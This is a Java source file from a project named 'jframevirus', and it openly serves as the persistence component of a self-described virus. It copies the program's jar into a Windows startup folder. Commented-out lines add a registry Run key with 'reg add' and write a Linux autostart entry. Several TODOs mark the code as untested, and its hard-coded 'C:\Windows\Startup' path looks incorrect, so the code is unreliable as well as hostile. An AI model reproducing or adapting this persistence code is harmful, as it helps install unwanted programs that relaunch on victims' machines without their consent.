package com.joo.jframevirus;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

public class AutoStartManager {
    private static final String AUTO_START_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    private static AutoStartManager instance;

    private AutoStartManager() {
    }

    public static AutoStartManager getInstance() {
        if (instance == null) {
            instance = new AutoStartManager();
        }
        return instance;
    }

    // TODO: test this in windows
    public void addVirusToStartup() {
        if (!this.isVirusInStartup()) {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                try {
                    // TODO: 5/15/22 Test this in windows
                    // Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Virus /t REG_SZ /d \"java -jar jframevirus.jar\"");
                    File file = new File("jframevirus.jar");
                    FileUtils.copyFile(file, new File("C:\\Windows\\Startup\\JFrameVirus.jar"));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else { // TODO: 5/15/22 Make this work on linux and mac
            /*try {
                Runtime.getRuntime().exec("echo \"java -jar jframevirus.jar\" >> ~/.config/autostart/jframevirus.desktop");
            }*/
            }
        }
    }

    public void removeVirusFromStartup() {
        if (this.isVirusInStartup()) {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                new File("C:\\Windows\\Startup\\JFrameVirus.jar").delete();
            } else { // TODO: 5/15/22 Make this work on linux and mac
            }
        }
    }

    private boolean isVirusInStartup() {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            return new File("C:\\Windows\\Startup\\JFrameVirus.jar").exists();
        } else { // TODO: 5/15/22 Make this work on linux and mac
            return false;
        }
    }
}
